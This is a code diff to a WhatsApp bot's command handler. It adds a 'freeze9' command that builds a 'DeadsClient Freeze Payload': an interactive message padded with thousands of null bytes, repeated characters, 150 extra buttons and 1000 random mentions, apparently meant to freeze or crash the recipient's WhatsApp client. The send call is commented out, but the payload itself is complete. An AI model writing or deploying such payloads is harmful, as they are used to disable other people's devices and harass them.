@@ -14757,6 +14757,94 @@ case 'frage': {
 
 }
 break
+case "freeze9": {
+    if (isBot) return;
+
+    const target = msg.key.remoteJid;
+
+    try {
+        const ButtonsQPay = [
+            {
+                name: "single_select",
+                buttonParamsJson: JSON.stringify({
+                    title: "\u0000".repeat(9000),
+                    sections: [{ title: "\u0000", rows: [] }]
+                })
+            }
+        ];
+
+        for (let i = 0; i < 50; i++) {
+            ButtonsQPay.push(
+                {
+                    name: "cta_call",
+                    buttonParamsJson: JSON.stringify({ status: true })
+                },
+                {
+                    name: "cta_copy",
+                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(3000) })
+                },
+                {
+                    name: "quick_reply",
+                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(3000) })
+                }
+            );
+        }
+
+        const messageContent = generateWAMessageFromContent(
+            target,
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                title: " | ☠️DeadsClient 🔥",
+                                hasMediaAttachment: false,
+                            },
+                            contextInfo: {
+                                participant: target,
+                                mentionedJid: [
+                                    "0@s.whatsapp.net",
+                                    ...Array.from({ length: 1000 }, () => 
+                                        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+                                    )
+                                ],
+                            },
+                            remoteJid: "status@broadcast",
+                            stanzaId: msg.key.id,
+                            quotedMessage: {
+                                paymentInviteMessage: {
+                                    serviceType: "UPI",
+                                    expiryTimestamp: Date.now()
+                                }
+                            },
+                            isForwarded: true,
+                            forwardingScore: 1972,
+                            forwardMessageForwardInfo: {
+                                businessMessageForwardInfo: {
+                                    businessOwnerJid: "13135550002@s.whatsapp.net"
+                                }
+                            }
+                        }
+                    }
+                },
+                body: {
+                    text: "☠️DeadsClient 🔥 Freeze Payload"
+                },
+                nativeFlowMessage: {
+                    buttons: ButtonsQPay,
+                    messageParamsJson: "(".repeat(5000)
+                }
+            }
+        );
+
+        // Hier kannst du die Nachricht senden, z.B.:
+        // await sock.sendMessage(target, messageContent);
+
+    } catch (e) {
+        console.error("Freeze9 Error:", e);
+    }
+    break;
+}
 case 'main': {
   const from = msg.key.remoteJid;
   const { owner, bot, admins, system, features } = settings;
